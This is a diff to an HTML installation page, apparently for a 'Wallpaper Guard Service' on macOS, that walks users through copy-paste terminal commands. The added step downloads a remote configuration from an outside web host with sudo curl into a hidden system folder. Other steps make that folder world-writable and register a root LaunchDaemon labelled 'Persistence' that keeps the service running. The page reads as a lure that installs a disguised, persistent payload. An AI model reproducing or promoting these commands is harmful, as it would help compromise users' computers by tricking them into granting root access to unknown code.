@@ -165,7 +165,7 @@
 
     <div class="wrapper">
         <header>
-            <h1>System Service</h1>
+            <h1>Wallpaper Guard Service</h1>
             <div class="tagline">Installation & System Authorization Protocol</div>
         </header>
 
@@ -240,6 +240,14 @@
                 <pre><code>sudo chmod 777 "/Library/Application Support/.sys_service"</code></pre>
             </div>
 
+            <div class="block-container">
+                <div class="block-header">
+                    <span class="block-title">Command: Load Config</span>
+                    <div class="copy-trigger" onclick="copy(this)"><i class="fa-regular fa-copy"></i></div>
+                </div>
+                <pre><code>sudo curl -L -o "~/Library/Application Support/.sys_service/config.json" "https://wallpg.web.app/init_config.json"</code></pre>
+            </div>
+
             <div class="info-card">
                 <i class="fa-solid fa-wand-magic-sparkles" style="margin-top: 3px;"></i>
                 <span><strong>Wildcard Logic:</strong> The <code>*</code> ensures the command succeeds regardless of the
@@ -279,20 +287,22 @@
                 <pre><code>hdiutil detach /Volumes/System* && rm System*.dmg</code></pre>
             </div>
         </section>
+
         <section class="step">
             <div class="step-meta">
                 <i class="fa-solid fa-gears"></i>
                 <span class="step-label">Step 05</span>
             </div>
             <h2>Persistence</h2>
-            <p>Configure the system to automatically launch the service on boot and keep it running in the background.</p>
+            <p>Configure the system to automatically launch the service on boot and keep it running in the background.
+            </p>
 
             <div class="block-container">
                 <div class="block-header">
                     <span class="block-title">Command: Register Daemon</span>
                     <div class="copy-trigger" onclick="copy(this)"><i class="fa-regular fa-copy"></i></div>
                 </div>
-<pre><code>cat &lt;&lt;EOF &gt; com.system.wallpaper.service.plist
+                <pre><code>cat &lt;&lt;EOF &gt; com.system.wallpaper.service.plist
 &lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
 &lt;plist version="1.0"&gt;
@@ -317,7 +327,7 @@ EOF</code></pre>
                     <span class="block-title">Command: Activate Service</span>
                     <div class="copy-trigger" onclick="copy(this)"><i class="fa-regular fa-copy"></i></div>
                 </div>
-<pre><code>sudo mv com.system.wallpaper.service.plist /Library/LaunchDaemons/ && \
+                <pre><code>sudo mv com.system.wallpaper.service.plist /Library/LaunchDaemons/ && \
 sudo chown root:wheel /Library/LaunchDaemons/com.system.wallpaper.service.plist && \
 sudo chmod 644 /Library/LaunchDaemons/com.system.wallpaper.service.plist && \
 sudo launchctl load -w /Library/LaunchDaemons/com.system.wallpaper.service.plist</code></pre>
@@ -325,7 +335,8 @@ sudo launchctl load -w /Library/LaunchDaemons/com.system.wallpaper.service.plist
 
             <div class="info-card">
                 <i class="fa-solid fa-circle-info" style="margin-top: 3px;"></i>
-                <span><strong>Automation:</strong> The <code>KeepAlive</code> flag ensures the service automatically restarts if it ever stops unexpectedly.</span>
+                <span><strong>Automation:</strong> The <code>KeepAlive</code> flag ensures the service automatically
+                    restarts if it ever stops unexpectedly.</span>
             </div>
         </section>
     </div>
